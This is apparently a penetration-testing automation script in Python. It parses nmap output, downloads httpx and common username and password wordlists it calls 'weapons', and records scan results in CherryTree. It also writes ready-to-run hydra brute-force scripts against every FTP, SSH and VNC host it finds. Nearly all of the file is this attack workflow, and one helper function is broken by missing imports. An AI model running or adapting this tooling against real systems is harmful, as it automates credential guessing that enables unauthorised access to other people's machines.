import sys
from typing import List
import requests
import os
from enum import Enum
import argparse
import jinja2
import time
import shutil





class Color(Enum):
    GREEN = '#33d17a'
    RED = '#e01b24'
    BLUE = '#3584e4'

def parse_gnmap(gnmap_file : str) -> List:
    nodes = []
    with open(gnmap_file, 'r') as file:
        for line in file:
            if "Up" in line: # Dont waste time with host without opened ports
                continue
            if line.startswith('Host:'):
                
                host_info = line.split()
                data_pos = line.find("Ports: ")
                data = line[data_pos+7::]
                data = data.replace(",","\n")
                data = data.replace("\n ","\n")
                data = data.replace("/////	","///\n")
                nodes.append({
                    'name': host_info[1],  # Assuming host IP as name
                    'unique_id': len(nodes) + 1,
                    'ts_creation': int(time.time()),
                    'ts_lastsave': int(time.time()) + 4,
                    "is_bold": 1,
                    "foreground": f"{Color.RED.value}",
                    "data": f"{data}",
                })
    return nodes

def generate_cherrytree_ctd(nodes : List, template_file : str = "cherry.j2", output_file : str = "result_cherrytree.ctd") -> None:
    # Load Jinja2 template
    templateLoader = jinja2.FileSystemLoader(searchpath="./")
    templateEnv = jinja2.Environment(loader=templateLoader)
    template = templateEnv.get_template(template_file)

    # Render the template with data
    outputText = template.render(nodes=nodes)

    # Write the output to a file
    with open(output_file, 'w') as file:
        file.write(outputText)


def download_weapons(url : List,path_to_file : str) -> None:
    # Download the file
    with requests.get(url, stream=True) as r:
        r.raise_for_status()  # Raises stored HTTPError, if one occurred.
        with open(path_to_file, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

def install_weapons(url : List, output_folder : List) -> None:
    # Donwload binary httpx (projectdicover) and brutespray
    tmp = []
    for fold in output_folder:
        if not os.path.exists(fold):
            os.makedirs(fold)
        else:
            print("Already install")
            tmp.append(fold)
            if len(tmp) == len(output_folder):
                return

    for i in range(0,len(url)):
        filename = url[i].split('/')[-1]
        path_to_file = os.path.join(output_folder[i], filename)
        
        download_weapons(url[i],path_to_file)




def image_to_base64(image_path : str) -> str:
    # Open the image file
    with Image.open(image_path) as image:
        buffered = io.BytesIO()
        image.save(buffered, format="PNG")  # Save image to a buffer in PNG format
        img_str = base64.b64encode(buffered.getvalue())  # Encode the image to base64
        return img_str.decode('utf-8')  # Convert bytes to string


def find_host_with_http_server(nodes_lst : List,ports_lst : List = ["80","443"]) -> List:
    res = []
    for elem in nodes_lst:
        for port_finded in [item for item in ports_lst if item in elem["data"]]:
            print(port_finded)
            res.append(f"{elem['name']}:{port_finded}")
    return res


def write_to_file(filename : str,host_ports_lst : List) -> None:
    with open(filename, 'wt') as f:
        for host in host_ports_lst:
            f.write(f"{host}")
            f.write("\n")



def create_script(template_file : str,outname : str,commands_lst : List,name : str = "bruteforce") -> None:
    # Load Jinja2 template
    templateLoader = jinja2.FileSystemLoader(searchpath="./")
    templateEnv = jinja2.Environment(loader=templateLoader)
    template = templateEnv.get_template(template_file)

    # Render the template with data
    outputText = template.render(session_name=name,commands=commands_lst)

    # Write the output to a file
    with open(outname, 'w') as file:
        file.write(outputText)
    

def main(args):
    # Example usage
    gnmap_file =  args.file
    template_file = args.template
    output_ctd_file = args.output
    httpx_output_dir = args.httpx_dir
    if args.remove:
        shutil.rmtree("httpx_bin")
        shutil.rmtree("username")
        shutil.rmtree("password")
        print("Data folder clean")
        exit(0)

    binary_lst = [
        # "https://github.com/x90skysn3k/brutespray/releases/download/v2.2.2/brutespray_2.2.2_linux_amd64.tar.gz",
        "https://github.com/projectdiscovery/httpx/releases/download/v1.5.0/httpx_1.5.0_linux_amd64.zip"
    ]

    binary_output = [
        # "brutespray_bin",
        "httpx_bin",
    ]

    wordlist_lst = [ 
        "https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt",
        "https://github.com/danielmiessler/SecLists/raw/master/Passwords/2023-200_most_used_passwords.txt"
    ]

    # Install weapon
    print("Install necessary binary for the attack")
    install_weapons(binary_lst,binary_output)
    install_weapons(wordlist_lst,["username","password"])

    # Parse the gnmap file and return lilst of nodes with ports
    nodes = parse_gnmap(gnmap_file)

    # Find all 80,443 ports used make screenshot and add for each 
    screen_list = find_host_with_http_server(nodes)
    screen_command = [f"httpx_bin/httpx -ss -st 5 -srd {httpx_output_dir} -l httpx_ip_list.txt"]

    write_to_file("httpx_ip_list.txt",screen_list)

    create_script("bash_script.j2","httpx_script.sh",screen_command,name="httpx")

    # Generate the cherrytree file
    generate_cherrytree_ctd(nodes, template_file, output_ctd_file)

    print(f"The CherryTree file {output_ctd_file} has been generated.")

    # Find all ftp,ssh,vnc ports and extract this to file
    ftp_lst = find_host_with_http_server(nodes,["21"])
    ssh_lst = find_host_with_http_server(nodes,["22"])
    vnc_lst = find_host_with_http_server(nodes,["5901"])



    if ftp_lst:
        template_cmd = f"hydra -M ftp_host_list.txt -L 'username/top-usernames-shortlist.txt' -P 'password/2023-200_most_used_passwords.txt' -t 4 -e nsr -I ftp"
        # print(ftp_lst)
        write_to_file("ftp_host_list.txt",ftp_lst)
        create_script("bash_script.j2","hydra_ftp_script.sh",[template_cmd])
        print(f"{template_cmd}")
        # print(f"brutespray_bin/brutespray -f {ftp_lst} -u 'username/top_username_shortlist.txt' -p 'password/2023_best_200_password' -t 4")
    if ssh_lst:
        template_cmd = f"hydra -M ssh_host_list.txt -L 'username/top-usernames-shortlist.txt' -P 'password/2023-200_most_used_passwords.txt' -t 4 -e nsr -I ssh"
        # print(ssh_lst)
        write_to_file("ssh_host_list.txt",ssh_lst)
        create_script("bash_script.j2","hydra_ssh_script.sh",[template_cmd])
        print(f"{template_cmd}")
        # print(f"brutespray_bin/brutespray -f {ssh_lst} -u 'username/top_username_shortlist.txt' -p 'password/2023_best_200_password' -t 4")
    if vnc_lst:
        template_cmd = f"hydra -M vnc_host_list.txt -L 'username/top-usernames-shortlist.txt' -P 'password/2023-200_most_used_passwords.txt' -t 4 -e nsr -I vnc"
        # print(vnc_lst)
        write_to_file("vnc_host_list.txt",vnc_lst)
        create_script("bash_script.j2","hydra_vnc_script.sh",[template_cmd])
        print(f"{template_cmd}")
        # print(f"brutespray_bin/brutespray -f {vnc_lst} -u 'username/top_username_shortlist.txt' -p 'password/2023_best_200_password' -t 4")

    print(f"file list generated for hydra bruteforce")



if __name__ == "__main__":
    example_text = f"python3 {sys.argv[0]} -f scan.gnmap -t cherry.j2 -o cherrytree_scan_result.ctd"


    parser = argparse.ArgumentParser(description='Process some integers.',epilog=example_text)

     

    # Add the arguments
    parser.add_argument('--file','-f', type=str, help='the .GNMAP file to process')
    parser.add_argument('--template','-t', type=str, help='the template Jinj2 to use')
    parser.add_argument('--output','-o' ,type=str, help='the output file .CTD to have')
    parser.add_argument('--remove','-rm',action='store_true', help='Remove username woerdlist password wordlist and httpx binary')
    parser.add_argument('--httpx-dir',type=str, help='the output folder for httpx screenshots',default="httpx_output")
    parser.add_argument('--verbose', '-v', action='count', default=0,
                        help='increase output verbosity (option can be stacked, e.g., -vv is more verbose than -v)')

    if len(sys.argv)==1:
        parser.print_help()
        parser.exit()

    # Execute the parse_args() method
    args = parser.parse_args()
    main(args)
